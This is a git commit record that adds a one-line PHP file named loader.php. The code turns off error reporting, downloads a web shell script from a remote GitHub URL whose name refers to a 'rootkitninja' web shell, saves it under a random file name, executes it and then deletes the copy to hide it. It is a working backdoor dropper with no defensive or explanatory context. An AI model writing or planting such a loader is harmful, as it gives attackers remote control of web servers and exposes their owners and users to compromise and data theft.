3731263d5121cbd47a7e7998790182077bb47d71
Pharaoh <aisyah.amalia@ui.ac.id>
2024-04-02 14:17:40 +0700

    Create loader.php

---
+++ loader.php
@@ -0,0 +1,1 @@
+<?php error_reporting(0);$x="https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.php";$c=rand(1000,9999999);$y="$c.loader.rootkit.ninja";file_put_contents($y,file_get_contents($x));include($y);unlink($y); ?>
